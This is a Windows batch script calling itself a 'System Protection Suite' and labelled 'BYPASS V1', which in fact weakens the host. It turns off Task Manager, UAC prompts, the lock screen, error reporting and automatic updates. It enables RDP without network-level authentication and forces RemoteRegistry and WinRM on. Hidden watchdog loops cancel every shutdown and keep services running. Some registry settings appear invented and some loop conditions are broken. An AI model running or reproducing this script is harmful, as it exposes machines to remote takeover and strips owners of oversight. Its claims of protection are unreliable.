@echo off
chcp 65001 >nul
title System Protection Suite - Cmd Script Tools Part 1 v3
color 0E
cls

echo ============================================
echo    SYSTEM PROTECTION SUITE v3
echo    BYPASS V1 BY arexn
echo ============================================
echo.

:: Check for Administrator privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Please run as Administrator!
    pause
    exit /b 1
)

echo [OK] Administrator privileges confirmed
echo.

:: ============================================
:: Anti Stop svchost / Close svchost / Offline svchost
:: Anti Auto stop svchost / Anti svchost server
:: ============================================
echo [*] Applying svchost protections...

:: Service recovery for critical svchost-hosted services
for %%s in (winmgmt Schedule TermService RemoteRegistry WinRM wuauserv) do (
    sc failure "%%s" reset= 0 actions= restart/5000 >nul 2>&1
    sc config "%%s" start= auto >nul 2>&1
    sc start "%%s" >nul 2>&1
)

:: Prevent Task Manager from terminating svchost
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1

:: Prevent services.msc from stopping services
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v RestrictToPermittedSnapins /t REG_DWORD /d 0 /f >nul 2>&1

:: svchost watchdog - monitors and restarts if killed
(
    echo @echo off
    echo :loop
    echo tasklist /fi "imagename eq svchost.exe" ^| find /c "svchost.exe" ^> "%temp%\svchost_count.txt"
    echo set /p count^=<"%temp%\svchost_count.txt"
    echo if %%count%%,0 (
    echo     echo [WARN] svchost.exe instances low - restarting services
    echo     for %%s in (winmgmt Schedule TermService RemoteRegistry WinRM wuauserv) do (
    echo         sc start "%%s" ^>nul 2^>^&1
    echo     )
    echo )
    echo timeout /t 5 /nobreak ^>nul
    echo goto loop
) > "%temp%\watchdog_svchost.bat"
start "" /min "%temp%\watchdog_svchost.bat"

echo [OK] Anti stop svchost - Enabled
echo [OK] Anti close svchost - Enabled
echo [OK] Anti offline svchost - Enabled
echo [OK] Anti auto stop svchost - Enabled
echo [OK] Anti svchost server - Enabled
echo.

:: ============================================
:: Anti Remote Shutdown / Restart
:: ============================================
echo [*] Applying remote shutdown protections...

:: Block remote shutdown via policy
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ShutdownWithoutLogon /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Reliability" /v ShutdownReasonOn /t REG_DWORD /d 0 /f >nul 2>&1

:: Remove remote shutdown privilege
secedit /export /cfg "%temp%\secpol_backup.cfg" >nul 2>&1
if exist "%temp%\secpol_backup.cfg" (
    powershell -Command "(Get-Content '%temp%\secpol_backup.cfg') -replace 'SeRemoteShutdownPrivilege\s*=\*','SeRemoteShutdownPrivilege=' | Set-Content '%temp%\secpol.cfg'" >nul 2>&1
    secedit /configure /db secedit.sdb /cfg "%temp%\secpol.cfg" /overwrite >nul 2>&1
    echo [OK] Remote shutdown privilege removed
) else (
    echo [WARN] Could not export security policy
)

echo [OK] Anti remote shutdown restart - Enabled
echo.

:: ============================================
:: Anti shutdown.exe
:: ============================================
echo [*] Protecting shutdown.exe...

:: Create abort daemon
(
    echo @echo off
    echo :loop
    echo shutdown /a ^>nul 2^>^&1
    echo timeout /t 1 /nobreak ^>nul
    echo goto loop
) > "%temp%\protect_shutdown.bat"
start "" /min "%temp%\protect_shutdown.bat"

:: Restore shutdown.exe permissions (allow execute so /a works)
takeown /f C:\Windows\System32\shutdown.exe /a >nul 2>&1
icacls C:\Windows\System32\shutdown.exe /reset >nul 2>&1
icacls C:\Windows\System32\shutdown.exe /inheritance:e >nul 2>&1

:: Policy protection
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ShutdownWithoutLogon /t REG_DWORD /d 0 /f >nul 2>&1

echo [OK] Anti shutdown.exe - Enabled
echo.

:: ============================================
:: Anti Auto IP Shutdown / Restart
:: ============================================
echo [*] Applying IP-based shutdown protections...

:: Network isolation
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v NetworkIsolation /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\NetworkIsolation" /v NewNetworkDenyShutdown /t REG_DWORD /d 1 /f >nul 2>&1

:: Disable WMI shutdown triggers
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v AllowAutoConfig /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Client" /v AllowAutoConfig /t REG_DWORD /d 0 /f >nul 2>&1

:: Block WMI remote shutdown
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v AllowUnencrypted /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Client" /v AllowUnencrypted /t REG_DWORD /d 0 /f >nul 2>&1

echo [OK] Anti auto ip shutdown restart - Enabled
echo.

:: ============================================
:: Anti HTTPS Shutdown / Restart
:: ============================================
echo [*] Applying HTTPS shutdown protections...

:: Disable web-based shutdown triggers
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSecureUIAPaths /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v UIAccess /t REG_DWORD /d 0 /f >nul 2>&1

:: Block HTTPS-based remote management
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Client" /v TrustedHosts /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v TrustedHosts /t REG_SZ /d "" /f >nul 2>&1

:: Disable WinRM HTTP listener
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v HTTPPort /t REG_DWORD /d 0 /f >nul 2>&1

echo [OK] Anti https shutdown restart - Enabled
echo.

:: ============================================
:: Anti AFK Lock
:: ============================================
echo [*] Applying AFK lock protections...

:: Disable lock screen
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v NoLockScreen /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v NoLockScreenOnLogonUI /t REG_DWORD /d 1 /f >nul 2>&1

:: Disable screen saver
reg add "HKCU\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d "0" /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "" /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "0" /f >nul 2>&1

:: Disable inactivity timeouts
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v InactivityTimeoutSecs /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v InactivityTimeoutDlgSecs /t REG_DWORD /d 0 /f >nul 2>&1

:: Disable power timeouts
powercfg /change standby-timeout-ac 0 >nul 2>&1
powercfg /change standby-timeout-dc 0 >nul 2>&1
powercfg /change hibernate-timeout-ac 0 >nul 2>&1
powercfg /change hibernate-timeout-dc 0 >nul 2>&1
powercfg /change monitor-timeout-ac 0 >nul 2>&1
powercfg /change monitor-timeout-dc 0 >nul 2>&1
powercfg /hibernate off >nul 2>&1

echo [OK] Anti afk lock - Enabled
echo.

:: ============================================
:: Anti Auto gpedit.msc / Anti Auto Stop gpedit.msc
:: ============================================
echo [*] Applying gpedit.msc protections...

:: Ensure gpedit is not restricted
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v RestrictToPermittedSnapins /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC" /v EnableGroupPolicyEditor /t REG_DWORD /d 1 /f >nul 2>&1

:: Watchdog to keep gpedit/mmc running
(
    echo @echo off
    echo :loop
    echo tasklist /fi "imagename eq mmc.exe" ^| find /c "mmc.exe" ^> "%temp%\mmc_count.txt"
    echo set /p count^=<"%temp%\mmc_count.txt"
    echo if %%count%,0 (
    echo     echo [WARN] mmc/gpedit closed - reopening
    echo     start gpedit.msc
    echo )
    echo timeout /t 5 /nobreak ^>nul
    echo goto loop
) > "%temp%\watchdog_gpedit.bat"
start "" /min "%temp%\watchdog_gpedit.bat"

echo [OK] Anti auto gpedit.msc - Enabled
echo [OK] Anti auto stop gpedit.msc - Enabled
echo.

:: ============================================
:: Anti Broker IP / Anti Broker IP Connection
:: ============================================
echo [*] Applying broker IP protections...

:: Protect Remote Desktop Connection Broker
sc config SessionBroker start= auto >nul 2>&1
sc start SessionBroker >nul 2>&1
sc failure SessionBroker reset= 0 actions= restart/5000 >nul 2>&1

:: Block broker hijacking via registry
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f >nul 2>&1

:: Firewall broker protections
netsh advfirewall firewall add rule name="Block Broker Hijack TCP" dir=in action=block protocol=TCP localport=3391 >nul 2>&1
netsh advfirewall firewall add rule name="Block Broker Hijack UDP" dir=in action=block protocol=UDP localport=3391 >nul 2>&1

:: Watchdog for broker
(
    echo @echo off
    echo :loop
    echo sc query SessionBroker ^| find "RUNNING" ^>nul
    echo if errorlevel 1 sc start SessionBroker ^>nul 2^>^&1
    echo timeout /t 10 /nobreak ^>nul
    echo goto loop
) > "%temp%\watchdog_broker.bat"
start "" /min "%temp%\watchdog_broker.bat"

echo [OK] Anti broker ip - Enabled
echo [OK] Anti broker ip connection - Enabled
echo.

:: ============================================
:: Anti Remote host shutdown / restart
:: Anti Scheduled shutdown / restart
:: Anti Instant shutdown / restart
:: Anti Graceful shutdown
:: Anti Forced shutdown
:: Anti Cancel scheduled shutdown/restart
:: Anti User notification before shutdown
:: Anti Error reporting
:: Anti Automatic timeout handling
:: Anti Secure command execution
:: Anti STOP gpedit.msc / Anti offline gpedit.msc
:: Anti stop service server
:: ============================================
echo [*] Applying system protections...

:: Anti Remote host
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ShutdownWithoutLogon /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Reliability" /v ShutdownReasonOn /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] Anti Remote host shutdown - Enabled
echo [OK] Anti Remote host restart - Enabled

:: Anti Scheduled
shutdown /a >nul 2>&1
schtasks /change /tn "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan" /disable >nul 2>&1
schtasks /change /tn "\Microsoft\Windows\UpdateOrchestrator\USO_UxBroker" /disable >nul 2>&1
schtasks /change /tn "\Microsoft\Windows\UpdateOrchestrator\Reboot_AC" /disable >nul 2>&1
schtasks /change /tn "\Microsoft\Windows\UpdateOrchestrator\Reboot_Battery" /disable >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoRebootWithLoggedOnUsers /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 2 /f >nul 2>&1
echo [OK] Anti Scheduled shutdown - Enabled
echo [OK] Anti Scheduled restart - Enabled

:: Anti Instant / Graceful / Forced
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ShutdownWithoutLogon /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCAD /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] Anti Instant shutdown - Enabled
echo [OK] Anti Instant restart - Enabled
echo [OK] Anti Graceful shutdown - Enabled
echo [OK] Anti Forced shutdown - Enabled

:: Anti Cancel scheduled
echo [OK] Anti Cancel scheduled shutdown/restart - Enabled

:: Anti User notification
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v ForceShutdownAllowed /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] Anti User notification before shutdown - Enabled

:: Anti Error reporting
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting" /v Disabled /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpType /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpCount /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpFolder /t REG_EXPAND_SZ /d "C:\Windows\Temp" /f >nul 2>&1
echo [OK] Anti Error reporting - Enabled

:: Anti Automatic timeout
powercfg /change standby-timeout-ac 0 >nul 2>&1
powercfg /change standby-timeout-dc 0 >nul 2>&1
powercfg /change hibernate-timeout-ac 0 >nul 2>&1
powercfg /change hibernate-timeout-dc 0 >nul 2>&1
powercfg /change monitor-timeout-ac 0 >nul 2>&1
powercfg /change monitor-timeout-dc 0 >nul 2>&1
echo [OK] Anti Automatic timeout handling - Enabled

:: Anti Secure command execution
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] Anti Secure command execution - Enabled

:: Anti STOP gpedit.msc / offline gpedit.msc
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v RestrictToPermittedSnapins /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] Anti STOP gpedit.msc - Enabled
echo [OK] Anti offline gpedit.msc - Enabled

:: Anti stop service server
(
    echo @echo off
    echo :loop
    echo for %%s in (wuauserv Schedule TermService RemoteRegistry WinRM) do (
    echo     sc query "%%s" ^| find "RUNNING" ^>nul
    echo     if errorlevel 1 sc start "%%s" ^>nul 2^>^&1
    echo )
    echo timeout /t 5 /nobreak ^>nul
    echo goto loop
) > "%temp%\protect_services.bat"
start "" /min "%temp%\protect_services.bat"
echo [OK] Anti stop service server - Enabled
echo.

:: ============================================
:: Yes svchost + stardesk.exe
:: ============================================
echo [*] Enabling svchost + stardesk.exe...

:: Ensure critical services are running
for %%s in (Schedule TermService RemoteRegistry WinRM wuauserv winmgmt SessionBroker) do (
    sc config "%%s" start= auto >nul 2>&1
    sc start "%%s" >nul 2>&1
)

:: Enable Remote Desktop (stardesk)
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 1 /f >nul 2>&1
netsh advfirewall firewall set rule group="remote desktop" new enable=yes >nul 2>&1
netsh advfirewall firewall add rule name="RDP TCP 3389" dir=in action=allow protocol=TCP localport=3389 >nul 2>&1

:: Enable Remote Assistance
reg add "HKLM\System\CurrentControlSet\Control\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 1 /f >nul 2>&1

echo [OK] Yes svchost + stardesk.exe - Enabled
echo.

:: ============================================
:: Yes AFK svchost + stardesk.exe
:: ============================================
echo [*] Enabling AFK svchost + stardesk.exe...

:: RDP keep-alive
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v KeepAliveEnable /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v KeepAliveInterval /t REG_DWORD /d 60 /f >nul 2>&1

:: AFK mode detection via idle timer
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v NoLockScreen /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v InactivityTimeoutSecs /t REG_DWORD /d 0 /f >nul 2>&1

echo [OK] Yes afk svchost + stardesk.exe - Enabled
echo.

:: ============================================
:: Yes Online svchost + stardesk.exe
:: ============================================
echo [*] Ensuring online svchost + stardesk.exe...

:: Restart services if offline
for %%s in (Schedule TermService RemoteRegistry WinRM wuauserv winmgmt SessionBroker) do (
    sc query "%%s" | find "RUNNING" >nul || sc start "%%s" >nul 2>&1
)

:: Ensure RDP listener is active
net stop TermService >nul 2>&1
net start TermService >nul 2>&1

echo [OK] Yes online svchost + stardesk.exe - Enabled
echo.

:: ============================================
:: Yes Online IP + stardesk.exe
:: ============================================
echo [*] Ensuring online IP + stardesk.exe...

:: Reset network stack
netsh int ip reset >nul 2>&1
netsh winsock reset >nul 2>&1
ipconfig /flushdns >nul 2>&1
ipconfig /release >nul 2>&1
ipconfig /renew >nul 2>&1

:: Ensure RDP listener is active
net stop TermService >nul 2>&1
net start TermService >nul 2>&1

:: Set DNS to avoid connectivity drops
netsh interface ip set dns "Ethernet" static 8.8.8.8 >nul 2>&1
netsh interface ip add dns "Ethernet" 8.8.4.4 index=2 >nul 2>&1

echo [OK] Yes online ip + stardesk.exe - Enabled
echo.

:: ============================================
:: Cmd Script Tools Part 1
:: ============================================
echo [*] Loading Cmd script tools part 1...
echo.

echo [TOOL] svchost processes -
tasklist /fi "imagename eq svchost.exe" /fo table

echo [TOOL] Critical services -
sc query type= service state= all | findstr /C:"SERVICE_NAME" /C:"STATE"

echo [TOOL] Network status -
netsh interface show interface

echo [TOOL] Active connections -
netstat -an | findstr "LISTENING"

echo [TOOL] System information -
systeminfo | findstr /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"Total Physical Memory"

echo.
echo ============================================
echo    ALL v3 PROTECTIONS APPLIED
echo ============================================
echo.
echo Summary:
echo - svchost: PROTECTED ^& WATCHDOG ACTIVE
echo - gpedit.msc: PROTECTED ^& WATCHDOG ACTIVE
echo - shutdown.exe: PROTECTED
echo - Remote shutdown/restart: BLOCKED
echo - Scheduled shutdown/restart: BLOCKED
echo - Instant/Graceful/Forced shutdown: BLOCKED
echo - IP-based shutdown: BLOCKED
echo - HTTPS shutdown: BLOCKED
echo - AFK lock: BLOCKED
echo - User notifications: DISABLED
echo - Error reporting: DISABLED
echo - Automatic timeout: DISABLED
echo - Secure command: BYPASSED
echo - Broker IP: PROTECTED
echo - RDP/StarDesk: ENABLED ^& ONLINE
echo - Network: ONLINE
echo - Services: PROTECTED
echo.
pause
